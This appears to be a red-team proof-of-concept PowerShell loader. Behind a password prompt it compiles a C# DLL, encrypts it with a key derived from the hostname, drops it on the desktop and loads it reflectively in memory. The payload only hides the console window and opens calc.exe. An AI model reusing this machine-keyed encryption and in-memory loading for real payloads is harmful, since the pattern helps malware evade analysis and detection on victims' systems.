# thundr_encrypted_loader.ps1
# This script creates a C# DLL, encrypts it using the hostname as part of the key,
# drops the encrypted DLL to the desktop, and loads it when the correct password is provided

# Password protection
$correctPassword = "passw0rd111"
$inputPassword = Read-Host "Please enter the password to continue" -AsSecureString
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($inputPassword)
$plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
[System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR)  # Clean up the pointer

if ($plainPassword -ne $correctPassword) {
    Write-Host "Incorrect password. Exiting script." -ForegroundColor Red
    exit
}

Write-Host "Password correct. Proceeding with execution..." -ForegroundColor Green

# Get hostname for use in encryption key
$hostname = $env:COMPUTERNAME
Write-Host "Using hostname '$hostname' as part of the encryption key"

# Define the paths
$desktopPath = [Environment]::GetFolderPath("Desktop")
$encryptedDllPath = Join-Path -Path $desktopPath -ChildPath "thundr_encrypted.bin"

# C# code for the DLL that will launch calculator
$csharpCode = @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

public class ThundrCalculator
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    private const int SW_HIDE = 0;
    
    public static void LaunchCalculator()
    {
        try
        {
            // Hide console window if it exists
            var handle = GetConsoleWindow();
            if (handle != IntPtr.Zero)
            {
                ShowWindow(handle, SW_HIDE);
            }

            // Launch calculator
            Process.Start("calc.exe");
            
            // Sleep for 10 seconds
            Thread.Sleep(10000);
            
            // The method completes and assembly will be eligible for unloading
            // when no longer referenced
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }
}
'@

# Function to create an encryption key based on hostname
function Get-EncryptionKey {
    param (
        [string]$Hostname
    )
    
    # Create a deterministic key based on the hostname
    # This ensures the encryption is tied to this specific machine
    $hostnameBytes = [System.Text.Encoding]::UTF8.GetBytes($Hostname)
    
    # We need a 32-byte key for AES-256
    # If hostname is too short, we'll repeat it; if too long, we'll hash it
    if ($hostnameBytes.Length -lt 32) {
        $keyBytes = New-Object byte[] 32
        for ($i = 0; $i -lt 32; $i++) {
            $keyBytes[$i] = $hostnameBytes[$i % $hostnameBytes.Length]
        }
        return $keyBytes
    }
    else {
        # If the hostname produces too many bytes, hash it to get a fixed length
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        return $sha256.ComputeHash($hostnameBytes)
    }
}

# Function to encrypt a byte array
function Encrypt-Bytes {
    param (
        [byte[]]$Data,
        [byte[]]$Key
    )
    
    # Create AES encryption object
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key
    $aes.GenerateIV() # Generate a random IV
    $iv = $aes.IV
    
    # Create memory streams and crypto stream
    $msEncrypt = New-Object System.IO.MemoryStream
    $msEncrypt.Write($iv, 0, $iv.Length) # Write IV at the beginning
    
    $encryptor = $aes.CreateEncryptor()
    $csEncrypt = New-Object System.Security.Cryptography.CryptoStream $msEncrypt, $encryptor, "Write"
    
    # Write all data to the crypto stream
    $csEncrypt.Write($Data, 0, $Data.Length)
    $csEncrypt.FlushFinalBlock()
    
    # Get encrypted data and clean up
    $encrypted = $msEncrypt.ToArray()
    $csEncrypt.Close()
    $msEncrypt.Close()
    $aes.Dispose()
    
    return $encrypted
}

# Function to decrypt a byte array
function Decrypt-Bytes {
    param (
        [byte[]]$EncryptedData,
        [byte[]]$Key
    )
    
    # Create AES decryption object
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key
    
    # Extract the IV from the beginning of the encrypted data
    $iv = New-Object byte[] 16 # AES uses 16-byte IVs
    [Array]::Copy($EncryptedData, 0, $iv, 0, 16)
    $aes.IV = $iv
    
    # Calculate the actual encrypted data (everything after the IV)
    $encryptedContent = New-Object byte[] ($EncryptedData.Length - 16)
    [Array]::Copy($EncryptedData, 16, $encryptedContent, 0, $encryptedContent.Length)
    
    # Create memory streams and crypto stream for decryption
    $msDecrypt = New-Object System.IO.MemoryStream $encryptedContent
    $decryptor = $aes.CreateDecryptor()
    $csDecrypt = New-Object System.Security.Cryptography.CryptoStream $msDecrypt, $decryptor, "Read"
    
    # Read the decrypted data
    $decrypted = New-Object byte[] $encryptedContent.Length
    $bytesRead = $csDecrypt.Read($decrypted, 0, $decrypted.Length)
    
    # Resize array to actual bytes read
    $result = New-Object byte[] $bytesRead
    [Array]::Copy($decrypted, 0, $result, 0, $bytesRead)
    
    # Clean up
    $csDecrypt.Close()
    $msDecrypt.Close()
    $aes.Dispose()
    
    return $result
}

Write-Host "Compiling C# code in memory..."

# Add the required .NET assemblies for compilation
Add-Type -AssemblyName System.CodeDom

# Create an in-memory compiler
$provider = New-Object Microsoft.CSharp.CSharpCodeProvider
$params = New-Object System.CodeDom.Compiler.CompilerParameters

# Configure the compiler to generate an in-memory assembly
$params.GenerateInMemory = $false  # We now want the DLL as a file first
$params.GenerateExecutable = $false
$params.TreatWarningsAsErrors = $false
$params.WarningLevel = 4

# Create a temporary file to hold the assembly
$tempAssemblyPath = [System.IO.Path]::GetTempFileName() + ".dll"
$params.OutputAssembly = $tempAssemblyPath

# Reference the necessary assemblies
$params.ReferencedAssemblies.Add("System.dll") | Out-Null
$params.ReferencedAssemblies.Add([System.Threading.Thread].Assembly.Location) | Out-Null
$params.ReferencedAssemblies.Add([System.Diagnostics.Process].Assembly.Location) | Out-Null

# Compile the code
$results = $provider.CompileAssemblyFromSource($params, $csharpCode)

if ($results.Errors.Count -gt 0) {
    Write-Host "Compilation errors:" -ForegroundColor Red
    foreach ($error in $results.Errors) {
        Write-Host $error.ToString() -ForegroundColor Red
    }
    exit
}

Write-Host "Code compiled successfully to temporary DLL." -ForegroundColor Green

# Read the compiled DLL as bytes
$dllBytes = [System.IO.File]::ReadAllBytes($tempAssemblyPath)

# Delete the temporary DLL
[System.IO.File]::Delete($tempAssemblyPath)

# Get encryption key based on hostname
$encryptionKey = Get-EncryptionKey -Hostname $hostname

# Encrypt the DLL
Write-Host "Encrypting the DLL with a hostname-based key..."
$encryptedDllBytes = Encrypt-Bytes -Data $dllBytes -Key $encryptionKey

# Save the encrypted DLL to the desktop
Write-Host "Writing encrypted DLL to: $encryptedDllPath"
[System.IO.File]::WriteAllBytes($encryptedDllPath, $encryptedDllBytes)

Write-Host "Encrypted DLL created successfully." -ForegroundColor Green
Write-Host "Now decrypting and loading the DLL to launch calculator..."

# Decrypt the DLL from the file
$fileEncryptedBytes = [System.IO.File]::ReadAllBytes($encryptedDllPath)
$decryptedDllBytes = Decrypt-Bytes -EncryptedData $fileEncryptedBytes -Key $encryptionKey

# Load the decrypted assembly from memory
$assemblyLoadContext = [System.Reflection.Assembly]::Load($decryptedDllBytes)

# Get the ThundrCalculator type
$calculatorType = $assemblyLoadContext.GetType("ThundrCalculator")

# Invoke the LaunchCalculator method
Write-Host "Invoking LaunchCalculator method..."
$calculatorType.GetMethod("LaunchCalculator").Invoke($null, $null)

Write-Host "Calculator launched. Assembly will automatically unload after 10 seconds."
Write-Host "The encrypted DLL remains on the desktop at: $encryptedDllPath"